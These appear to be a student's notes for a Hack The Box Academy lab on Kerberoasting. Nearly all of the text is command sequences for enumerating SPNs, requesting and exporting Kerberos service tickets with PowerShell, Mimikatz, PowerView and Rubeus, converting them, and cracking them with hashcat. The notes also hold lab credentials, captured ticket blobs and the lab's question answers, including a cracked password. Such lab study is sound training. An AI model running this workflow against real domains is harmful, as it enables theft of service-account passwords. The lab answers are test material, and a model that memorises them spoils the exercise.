
## The Manual Way

### Enumerating SPNs with setspn.exe
```go
setspn.exe -Q */*
```



>[!Info] Next steps
> - This will request a users TGS ticket and load it into memory. 
> - Then extract via Mimikatz

>[!tip]
> Remember to perform these in PowerShell!
##### Target a Single User
>[!note]
> The targeted user is "DEV-PRE-SQL"

```go
Add-Type -AssemblyName System.IdentityModel
```

```go
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

	 - Add-Type: used to add .NET frameworks class to PowerShell session
	 - AssemblyName: parameter that allows you to specify an assembly that contains interested
	 - System.IdentityModel: a namespace, containing different classes for building security token services
	 - New-Object: creates an instance of a .NET framework object

##### Retrieve All Tickets Using setspn.exe
```go
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

##### Extracting Tickets from Memory with Mimikatz

>[!NOTE]
>`DEV-PRE-SQL`'s SPN ticketes are loaded into memory, now extract via Mimikatz

Start mimikatz and then....
```go
base64 /out:true
```

```go
kerberos::list /export
```

>[!Tip]
> Take the base64 piece from the output from the command above and strip it of new lines and white spaces as shown below

##### Preparing the Base64 Blob for Cracking
```go
echo "<base64 blob>" | tr -d \\n

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
```

Or place the output into a .kirbi file
```go
cat encoded_file | base64 -d > sqldev.kirbi
```

##### Extracting the Kerberos Ticket using kirbi2john.py
```go
python2.7 kirbi2john.py sqldev.kirbi
```

>[!warning]
> This will create a `crack_file`. You will need to modify it to use Hashcat

##### Modifying crack_file for Hashcat
```go
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

##### Cracking the Hash with Hashcat
```go
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

>[!tip]
> If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step


------------------------------------------------------------------------

## Automated / Tool Based Route

##### Using PowerView to Enumerate SPN Accounts
```go
Import-Module .\PowerView.ps1
```

```go
Get-DomainUser * -spn | select samaccountname
```

>[!tip]
>Choose a target SPN account from the list produced from the command above.

###### Using PowerView to Target a Specific User
```go
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

##### Exporting All Tickets to a CSV File
```go
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

##### Viewing the Contents of the .CSV File
```go
 cat .\ilfreight_tgs.csv
```

## Rubeus

>[!0info] 
> This command gathers stats about users; whether or not they're kerberoastable, type of encryption each supports, any available SPN accounts etc
```go
.\Rubeus.exe kerberoast /stats
```

##### The /nowrap Flag

>[!info]
> The /nowrap flag prevents base64 blobs from being column wrapped
```go
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```


---------------------------

# Encryption Types


| Encryption Type | Description       |
| --------------- | ----------------- |
| $krb5tgs$23\$*  | RC4 type 23       |
| $krb5tgs$18\$*  | AES-256 (type 18) |
|                 |                   |

>[!tip]
> Using PowerView, verify the msDS-SupportedEncryptionTypes attribute is set to 0, meaning the specific encryption type is not defined and set to the default RC4_HMAC_MD5.
>
>This makes it easier to crack with HashCat since it is a type 23 encryption. Type AES-128 (type 17) and AES-256 (type 18) TGS tickets take longer to crack.


##### Check supported Encryption Types
```go
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

##### the tgteleg Flag - Request an RC4 ticket, regardless of encryption type
```go
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

----------------------------------------------------

# Questions

Username
```go
htb-student
```

Password
```go
Academy_student_AD!
```

RDP
```go
xfreerdp /v:10.129.53.136 /u:htb-student /p:'Academy_student_AD!' /smart-sizing:3400x2000
```

```go
xfreerdp /v:10.129.52.162 /u:htb-student /p:'Academy_student_AD!' /smart-sizing:3400x2000 /drive:SkillShare,/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Kerberoasting-Windows
```

### Question 1: What is the name of the service account with the SPN 'vmware/inlanefreight.local'?
Answer
```go
svc_vmwaresso
```

Just run the command the name will be at the bottom of the output:
```go
setspn.exe -Q */*
```

### Question 2: Crack the password for this account and submit it as your answer.

Answer:
```go
Virtual01
```

```go
Add-Type -AssemblyName System.IdentityModel
```

```go
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken            -ArgumentList "vmware/inlanefreight.local"
```

```go
doIGGDCCBhSgAwIBBaEDAgEWooIFFTCCBRFhggUNMIIFCaADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZ2bXdhcmUbE2lubGFuZWZyZWln
aHQubG9jYWyjggS/MIIEu6ADAgEXoQMCAQKiggStBIIEqUVhF6wmfjbn9mVwWE9M
TBJcwLFDdEcUmltaaYZq8xGdPU2LCUm/Peg1IikQAVRsrWVMd6uMQ5A8WitdyT92
ItlbgqnEZPVkPtmixGC9lgbVgQIroHSKckadnQ0eJqZ4LLvpGIuIb00ekUsrgw90
ugFw4nTwgk9zHpfaHP/txsxLwcyv4BjFcxYNQLVC/2hi7RKA9N5tveUYVyqGRBeL
ReW8bmGxwfxIitXsYi74+FKJ4kPqMKIlRDnnsAkSldKeG7QTROHExLgpZVGSX4Oc
c2LRfBeT181n30kdRJUvem7jF9CWVUUBM2dy6N+dz21+w20M3vH0epyAp5hH6rtS
bB4gXHZ9IKqU2CN8fo80c8YD1nZr2Ah2TnwqgAFuUhZmky41imM2ZBP+bcShMGKm
1Lw5YFSo0eWsQckWPEcr1Xi9xNdoraeDq8BSFmJxAeVLCVzp/a1/lyDpsBbXtfP/
tqgDSdZT3gAu3w0bTBCj8vodPswTF93tQ1cQZrOpTRYAVTeQp5fzCJC0bj5qV5mk
dEq6aAAOZe4fY8W6PbRt/VPa6NbcAtRXHwcYaVlVTGndtgxyIMPy/VvXI2vgwj/2
s2f21fypRap0RZu9+diT2gnqtgFPR1g3p1ls6+V+J2Yp/LCh4pYAbkp5rEKBJoJr
rzKtCxDvZZYMLWHs3Pk72axukc763GUykT02qIMNziN+vz8rwJoZ5vY1q4mS4vBc
Qt5DfiY+5/aeM1jhpBJDhv9WwE9TR7S4BDqkBP4FucGgXshBS+f9QDAcI4seeIF3
LNK1Xc7Sufk5kgJj7vJSksXYjLGYPgflWQ6Knd4D0/AOY/Gyf2yvXuL8D4EQrXbt
41ZB92IVixHZu1nqjb8sI0s6D8V1+94zYkHxLisY3c+cDhj4EpoqjeJbD2+OtBuW
DlmM/mrSw5Y2Yq2MD1A8/ieg0vFG8iIeWwONyF7lgiD1Yf8Uv8mdtqRHwXOz+Exz
7BS/4deoUDBcQ+38V54bDRFOYfQe8WeeYlgcpsIFA1UovWLsPOAdz5vKCCdXmA2v
Y5x12xmPiqHc13r0UIrPcKci4hFozZ8uv4EGX3zw8hNUqVFOG2gze+LcC0qaLtyv
yy7BaMm+wOhdlM92I++YgG/xkYE4If9Amrn8kprNMX9/xg+U24T84Hzwci2jbcVJ
4vSyCLJNl9UcGGTIvqOL2bNEHyAJZxtgT/OBv15iRTLqERopl6w9aT7bTUtFe9HK
WStoMubtsQy5MvCt3m7EwX5NU2f/VEnxBHJCwIypvzc10wcJSedT+Sfj3C7juSEj
MuVe8mehVw2DszH0BMPMijiEf6oIJc7RwCPxRCQl7kBV+BlKxrnxY4CY4ULwZQZ4
gaTeoKvbrwj3Zit3RZYz2j90e2K0Ne3VnIgkeZ4o/6+fdiYA9Ulb79HMdFqc5/a9
akROttO/8XQKCurCLWGKYOB1/LdtLpnle+b1ZQSJEVbh4rdQDz3vzdweCTdeE5vV
dFPCVyAFNuiJwKObh7ZClPTIaZD0nAoK0DNVeE6nkzz2kyGoty0J4Ck9u+WdslbG
xGkz4Tw7vFdcDQ4Klt87gKyf9KfCHs9VfScTo4HuMIHroAMCAQCigeMEgeB9gd0w
gdqggdcwgdQwgdGgGzAZoAMCARehEgQQ+KFeOYgTAADzpRbKgiEGPaEVGxNJTkxB
TkVGUkVJR0hULkxPQ0FMohgwFqADAgEBoQ8wDRsLaHRiLXN0dWRlbnSjBwMFAECh
AAClERgPMjAyNjA0MTQwMTA4MjVaphEYDzIwMjYwNDE0MTEwMDIwWqcRGA8yMDI2
MDQyMTAxMDAyMFqoFRsTSU5MQU5FRlJFSUdIVC5MT0NBTKkoMCagAwIBAqEfMB0b
BnZtd2FyZRsTaW5sYW5lZnJlaWdodC5sb2NhbA==
```

```go
cat encoded_file | base64 -d > vmware.kirbi
```

Extract the Kerberos Ticket
```go
python3 kirbi2john.py vmware.kirbi
```

Modify file for hashcat
```go
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > vmwarehashcat
```

Crack the hash
```go
hashcat -m 13100 vmwarehashcat /usr/share/wordlists/rockyou.txt
```

